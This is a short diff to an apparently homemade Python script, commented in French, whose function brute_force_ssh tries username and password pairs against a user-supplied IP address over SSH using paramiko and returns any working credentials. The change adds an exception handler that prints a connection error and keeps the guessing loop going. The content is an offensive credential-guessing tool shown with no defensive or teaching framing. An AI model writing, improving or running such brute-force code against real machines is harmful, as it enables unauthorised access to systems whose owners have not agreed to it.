@@ -56,9 +56,10 @@ def brute_force_ssh(ip):
                 return f"{username}:{password}"
             except paramiko.AuthenticationException:
                 continue
+            except Exception as e:
+                print(f"Impossible de se connecter en SSH à la machine {ip}: {e}")
+                continue
     print("Attack unsuccessful")
-
-
 
 # Début du script
 # Demande a l'utilisateur d'entrer l'adresse IP de la machine distante
